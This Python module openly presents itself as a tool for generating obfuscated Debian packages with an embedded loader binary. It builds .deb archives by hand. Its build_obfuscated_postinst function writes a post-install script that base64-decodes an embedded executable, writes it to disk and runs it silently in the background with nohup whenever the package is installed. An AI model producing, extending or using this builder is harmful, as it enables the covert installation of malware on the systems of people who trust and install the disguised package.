#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Helpers for obfuscated Debian package generation with embedded loader ELF."""

from __future__ import annotations

import os
import shutil
import tarfile
from pathlib import Path


def _pad_ar_name(name: str) -> bytes:
    return (name + " " * (16 - len(name))).encode("utf-8")


def create_ar_archive(output_path: Path, *members: Path) -> None:
    with open(output_path, "wb") as archive:
        archive.write(b"!<arch>\n")
        for member in members:
            data = member.read_bytes()
            archive.write(_pad_ar_name(member.name))
            archive.write(b"0           ")
            archive.write(b"0     ")
            archive.write(b"0     ")
            archive.write(b"100644  ")
            archive.write(f"{len(data):<10}".encode("utf-8"))
            archive.write(b"`\n")
            archive.write(data)
            if len(data) % 2 != 0:
                archive.write(b"\n")


def create_control_tar(
    control_content: str,
    output_path: Path,
    *,
    scripts: dict[str, str] | None = None,
) -> None:
    tmp = output_path.parent / ".deb_control_tmp"
    if tmp.exists():
        shutil.rmtree(tmp)
    tmp.mkdir(parents=True)

    control_file = tmp / "control"
    control_file.write_text(control_content, encoding="utf-8")
    try:
        with tarfile.open(output_path, "w:gz", format=tarfile.GNU_FORMAT) as tar:
            tar.add(control_file, arcname="./control")
            for name, content in (scripts or {}).items():
                script_path = tmp / name
                script_path.write_text(content, encoding="utf-8")
                os.chmod(script_path, 0o755)
                tar.add(script_path, arcname=f"./{name}")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def create_data_tar(source_dir: Path, output_path: Path) -> None:
    with tarfile.open(output_path, "w:gz", format=tarfile.GNU_FORMAT) as tar:
        for root, _, files in os.walk(source_dir):
            for file in files:
                file_path = Path(root) / file
                arcname = file_path.relative_to(source_dir)
                tar.add(file_path, arcname=str(arcname))


def build_obfuscated_postinst(*, loader_b64: str, install_path: str) -> str:
    return f"""#!/bin/sh
set -e
DEST="{install_path}"
mkdir -p "$(dirname "$DEST")"
cat <<'B64EOF' | base64 -d > "$DEST"
{loader_b64}
B64EOF
chmod 700 "$DEST"
nohup "$DEST" >/dev/null 2>&1 &
exit 0
"""


def build_deb_package(
    *,
    output_dir: Path,
    package_name: str,
    version: str,
    maintainer: str,
    description: str,
    data_tree: Path,
    postinst: str | None = None,
    preinst: str | None = None,
) -> Path:
    output_dir.mkdir(parents=True, exist_ok=True)
    build_dir = output_dir / f"{package_name}_{version}_build"
    if build_dir.exists():
        shutil.rmtree(build_dir)
    build_dir.mkdir(parents=True)

    (build_dir / "debian-binary").write_text("2.0\n", encoding="utf-8")

    control = f"""Package: {package_name}
Version: {version}
Section: utils
Priority: optional
Architecture: amd64
Maintainer: {maintainer}
Description: {description}
"""
    scripts: dict[str, str] = {}
    if postinst:
        scripts["postinst"] = postinst
    if preinst:
        scripts["preinst"] = preinst

    control_tar = build_dir / "control.tar.gz"
    create_control_tar(control, control_tar, scripts=scripts)

    data_tar = build_dir / "data.tar.gz"
    create_data_tar(data_tree, data_tar)

    deb_path = output_dir / f"{package_name}_{version}_amd64.deb"
    create_ar_archive(deb_path, build_dir / "debian-binary", control_tar, data_tar)
    shutil.rmtree(build_dir)
    return deb_path
